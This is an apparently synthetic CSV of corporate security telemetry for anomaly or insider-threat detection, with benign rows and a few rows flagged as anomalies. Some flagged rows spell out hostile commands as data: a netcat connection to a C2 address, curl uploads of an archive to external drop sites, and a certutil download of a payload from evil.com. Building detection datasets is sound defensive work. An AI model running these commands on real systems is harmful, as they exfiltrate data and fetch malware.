timestamp,user_id,username,department,ip_address,event_type,failed_login_attempts,files_affected,usb_bluetooth_usage,bytes_sent_kb,bytes_received_kb,destination_site,application_shell_cmd,status,is_anomaly,action,details
2026-03-01T08:49:44.825Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,2,0,24.4,575.6,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T08:52:49.096Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,1,16,0,6163.2,7512.2,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-01T08:54:46.363Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,2,0,77.8,687.3,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T08:57:48.337Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,3,0,136.6,768.3,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:01:11.820Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,4,0,176.3,1166,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:03:31.575Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,0,0,233.3,128,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:06:36.551Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,3,0,247.9,556.3,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:09:33.308Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,4,0,75.8,589.4,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:12:51.400Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,1,0,112.5,925.8,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:15:12.870Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,2,0,248.4,548.3,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:18:38.795Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,1,0,93,760.7,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:20:47.345Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,4,0,56.5,834.4,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:23:39.670Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,1,0,224.9,166.1,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:27:20.350Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,1,0,15.9,107.3,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:29:48.620Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,1,0,48.9,174.5,internal-portal.corp,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:33:06.740Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,3,0,63.1,320.7,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:35:43.444Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,3,0,159.6,815.3,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:38:48.132Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,267,0,140168.1,332.2,temp-dropzone.cc,curl -X POST --data-binary @archive.tar.gz,BLOCKED,1,QUARANTINE,Mass file exfiltration velocity to external site (267 files)
2026-03-01T09:41:35.136Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,1,3,0,181.8,1117.4,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:43:43.162Z,usr-108,henry.todd,FINANCE,10.0.5.12,LOGIN,0,1,0,124.7,1052.6,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:47:07.153Z,usr-104,david.kim,SALES,10.0.7.19,SHELL_EXECUTION,2,2,0,154.3,115.1,tunnel-ngrok.io,certutil -urlcache -split -f http://evil.com/payload.exe,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-01T09:50:08.152Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,2,0,19,1109.3,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:52:58.540Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,1,0,246.6,386,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:55:58.854Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,0,0,187.4,317.9,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T09:58:20.828Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,3,0,186.2,875.8,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:01:29.765Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,2,0,78.1,424.5,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:03:51.782Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,3,0,51.2,1201.2,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:07:10.882Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,3,1,80.8,456.6,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:10:23.924Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,1,0,192.4,421.9,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:12:50.952Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,2,0,144.8,554.6,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:16:03.168Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,0,0,89.5,81.7,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:19:01.764Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,0,0,7.7,607.9,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:21:39.679Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,2,1,224.5,65.8,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:24:37.927Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,3,0,7.9,199.2,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:27:03.211Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,0,0,112.9,94.9,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:30:10.665Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,1,0,58.2,848.4,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:32:56.662Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,1,0,84.2,981.6,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:35:43.819Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,4,0,81.4,735.6,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:38:39.266Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,3,0,99.8,1198.8,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:42:06.556Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,2,0,85.4,1217.5,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:44:13.240Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,2,0,200.8,359.4,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:47:41.216Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,3,0,18.3,929.8,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:50:42.558Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,4,0,54.7,58.2,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:53:35.301Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,0,0,155,1166.6,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:56:16.970Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,3,0,112.6,776.1,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T10:59:03.786Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,0,0,57.7,479.1,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:01:55.282Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,1,1,0,93.3,286.8,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:04:50.297Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,1,0,144.1,103.7,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:07:22.618Z,usr-104,david.kim,SALES,10.0.7.19,USB_ACTIVITY,0,81,1,55856.6,52.3,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-01T11:10:57.273Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,0,0,108.6,85.8,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:13:10.847Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,0,4,0,222.9,288.3,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:16:06.273Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,4,0,223.5,472.9,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:18:49.542Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,0,0,91.6,196.4,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:21:59.029Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,2,0,98.9,644.4,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:25:04.039Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,1,0,184.6,83,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:27:31.670Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,0,0,217.9,1068,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:30:28.431Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,0,0,237.1,682.5,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:33:19.259Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,2,0,85.7,624.9,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:36:36.415Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,1,2,0,53.8,547.2,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:39:00.815Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,4,0,57.9,72.3,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:42:11.886Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,3,0,77.9,939,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:44:52.311Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,3,0,234.8,654.8,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:48:11.343Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,0,0,57.9,335.3,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:51:07.995Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,1,0,34.2,575.7,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:54:02.214Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,79,0,150659.4,202.5,darknet-gateway.to,curl -X POST --data-binary @archive.tar.gz,SUCCESS,1,ALERT,Mass file exfiltration velocity to external site (79 files)
2026-03-01T11:56:37.393Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,3,0,216.4,576.8,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T11:59:34.544Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,4,0,187,943.3,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:02:07.646Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,3,0,139.3,195.7,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:04:54.509Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,2,0,106.5,519.7,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:08:20.240Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,4,0,183.6,237.7,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:11:18.449Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,3,0,8,1106.3,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:14:10.344Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,3,0,128,496.8,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:16:29.890Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,1,1,76.4,1035,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:19:22.706Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,3,0,85.1,175.4,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:22:24.138Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,3,0,63.5,1111.8,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:25:13.383Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,3,0,131.7,264.6,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:28:15.340Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,4,0,231.6,312.9,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:31:26.974Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,4,0,207.3,410.9,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:34:23.272Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,3,0,102.7,170.9,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:37:24.614Z,usr-103,carol.zhang,HR,10.0.2.88,LOGIN,0,0,0,79.8,775.2,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:39:22.637Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,0,0,153.3,640.5,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:43:13.107Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,4,0,101.6,410.3,internal-portal.corp,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:46:00.767Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,2,0,181.4,209.5,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:48:34.567Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,2,0,136.3,139.3,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:51:29.242Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,2,0,225.1,264.4,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:54:36.397Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,2,0,97,946,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:57:25.177Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,4,0,6.3,806,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T12:59:51.891Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,3,0,145.2,925.8,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:02:57.986Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,1,0,239.2,954.4,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:06:03.821Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,0,0,67.5,865.9,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:08:41.764Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,0,0,210.7,530.1,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:11:06.626Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,3,0,127.6,449.5,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:14:05.204Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,2,0,195.4,117.8,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:17:28.571Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,4,0,89.6,928.1,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:19:41.456Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,0,0,147,573.3,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:23:03.385Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,2,0,31,892.8,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:25:49.344Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,4,0,78.7,293.9,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:29:04.848Z,usr-108,henry.todd,FINANCE,10.0.5.12,LOGIN,0,4,0,118.9,170.9,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:31:17.529Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,0,0,176,1146.2,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:35:01.142Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,3,0,227.1,1074.4,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:37:28.206Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,59,0,90081,594.5,pastebin-raw.io,curl -X POST --data-binary @archive.tar.gz,SUCCESS,1,ALERT,Mass file exfiltration velocity to external site (59 files)
2026-03-01T13:40:37.681Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,1,0,166.6,420.3,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:43:26.558Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,0,0,25.3,141.9,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:45:54.159Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,4,0,21.4,125.5,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:48:30.824Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,3,0,145.5,751.3,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:51:53.285Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,0,0,80.9,338.3,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:54:48.121Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,4,0,135.4,238,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T13:57:56.353Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,1,4,0,82.8,203.7,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T14:00:00.120Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,0,3,0,26.9,198,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-01T14:02:58.625Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,0,2,0,140.8,861.9,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
